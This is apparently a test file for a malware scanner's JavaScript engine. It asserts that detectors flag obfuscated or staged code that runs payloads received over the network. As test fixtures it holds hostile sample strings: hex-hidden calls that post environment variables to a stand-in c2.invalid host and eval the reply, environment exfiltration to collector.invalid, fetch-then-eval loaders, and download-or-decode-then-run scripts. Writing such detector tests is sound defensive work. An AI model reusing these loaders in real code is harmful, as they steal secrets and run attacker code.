// 0.1.8 in the npm engine: names in strings a file decodes as it runs
// (lib/hooks.js decodedView), eval of a file's own decoder (SC-EVAL-DECODER),
// Function.constructor, statements over several rows and environment
// variables in the received-code detector (lib/received.js), and a script
// downloaded or decoded, written and run with a shell or an interpreter.
// python/tests/scanner/test_decoded_and_staged.py has the full cases and
// tests/architecture/test_js_parity_hooks.py compares the engines. Inert
// text: hosts are .invalid, nothing is executed.

import { test } from "node:test";
import assert from "node:assert/strict";
import { importTimeRisk, importTimeSeverity, installScriptRisk, runsReceivedCode, RULES } from "../src/index.js";
import { decodedView } from "../src/lib/hooks.js";

const NOTE = " (in strings it decodes as it runs)";
const hex = (s) => Buffer.from(s).toString("hex");

const TAILWIND = "\"use strict\";\n\nfunction g(h) { return h.replace(/../g, match => String.fromCharCode(parseInt(match, 16))); }\n\n"
  + `let hl = [\n    g('${hex("require")}'),\n    g('${hex("axios")}'),\n    g('${hex("post")}'),\n`
  + `    g('${hex("https://c2.invalid/a")}'),\n    g('${hex("then")}'),\n];\n\n`
  + "const writer = () => require(hl[1])[[hl[2]]](hl[3], { ...process.env })[[hl[4]]](r => eval(r.data));\n\n"
  + "module.exports = writer;\n";

test("a helper's hex names and a constant array are read decoded", () => {
  const view = decodedView(TAILWIND);
  assert.ok(view.includes("require('axios')[['post']]('https://c2.invalid/a', { ...process.env })[['then']]"));
  assert.equal(view.split("\n").length, TAILWIND.split("\n").length);
  const [reasons, line] = importTimeRisk(TAILWIND, "js");
  assert.deepEqual([reasons, line], [["runs code it receives over the network" + NOTE], 13]);
  assert.equal(importTimeSeverity(reasons), "CRITICAL");
});

test("names hidden from the install-script test", () => {
  const metrics = `(() => {\n  const a = require(\n    Buffer.from("${hex("https")}", "hex").toString()\n  );\n`
    + "  const env = Object.fromEntries(Object.keys(process[\"env\"]).map(k => [k, process[\"env\"][k]]));\n"
    + "  const req = a.request({ hostname: 'collector.invalid', method: 'POST' });\n  req.write(JSON.stringify(env));\n})();\n";
  assert.deepEqual(installScriptRisk(metrics),
    ["reads environment variables or credential files and sends data over the network" + NOTE]);
});

test("SC-EVAL-DECODER: eval of a decoder over a blob of character codes", () => {
  const rx = RULES.find((r) => r.id === "SC-EVAL-DECODER").re;
  const codes = Array.from({ length: 260 }, (_, k) => 40 + (k % 80)).join(",");
  assert.ok(rx.test("try{eval(function(s,n){return s.replace(/[a-zA-Z]/g,function(c){var b=c<=\"Z\"?65:97;"
    + "return String.fromCharCode((c.charCodeAt(0)-b+n)%26+b)})}([" + codes + "],17))}catch(e){}"));
  assert.ok(!rx.test("eval(function(s,n){return s}([1,2,3],1))"));
});

test("Function.constructor, rows joined, environment variables", () => {
  const ctor = "const axios = require('axios');\n(async () => {\n  const s = (await axios.get(u)).data;\n"
    + "  const h = new Function.constructor('require', s);\n  h(require);\n})();\n";
  const chain = "const axios = require('axios');\n(async () => {\n  axios\n    .post('https://c2.invalid/a', { v })\n"
    + "    .then((r) => {\n      eval(r.data.model);\n    });\n})();\n";
  const env = "import os, requests\nos.environ['P'] = requests.get(u).text\nexec(os.getenv('P'))\n";
  assert.equal(runsReceivedCode(ctor), 4);
  assert.equal(runsReceivedCode(chain), 6);
  assert.equal(runsReceivedCode(env), 3);
});

test("a script downloaded, or decoded, written and run with an interpreter", () => {
  const bash = "import os, subprocess, requests\nr = requests.get(u)\nwith open(p, 'wb') as f:\n    f.write(r.content)\n"
    + "subprocess.run(['/bin/bash', p])\n";
  assert.deepEqual(installScriptRisk(bash), ["downloads a script and runs it with bash"]);
  const decoded = "import subprocess, base64, sys, os\nb = 'cHJpbnQoMSkK'\nwith open(p, 'wb') as f:\n"
    + "    f.write(base64.b64decode(b))\nsubprocess.run([sys.executable, p])\n";
  const [reasons] = importTimeRisk(decoded, "py");
  assert.deepEqual(reasons, ["writes code it decodes to a file and runs it with Python"]);
  assert.equal(importTimeSeverity(reasons), "CRITICAL");
});

test("members read by name, and a runner handed to a call (the follower's adversarial pass)", () => {
  const RUN = "runs code it receives over the network";
  for (const text of [
    "import requests\nexec(getattr(requests, 'get')('https://c2.invalid/p').text)\n",
    "import requests\nr = requests.get('https://c2.invalid/p')\nexec(r.__dict__['_content'])\n",
    "fetch('https://c2.invalid/p').then((r) => r.text()).then(eval);\n",
    "const https = require('https');\nhttps.get('https://c2.invalid/p', (res) => res.on('data', eval));\n",
  ]) {
    assert.deepEqual(importTimeRisk(text)[0], [RUN], text);
  }
  assert.equal(runsReceivedCode("fetch('https://c2.invalid/p').then((r) => r.text()).then(JSON.parse);\n"), null);
});
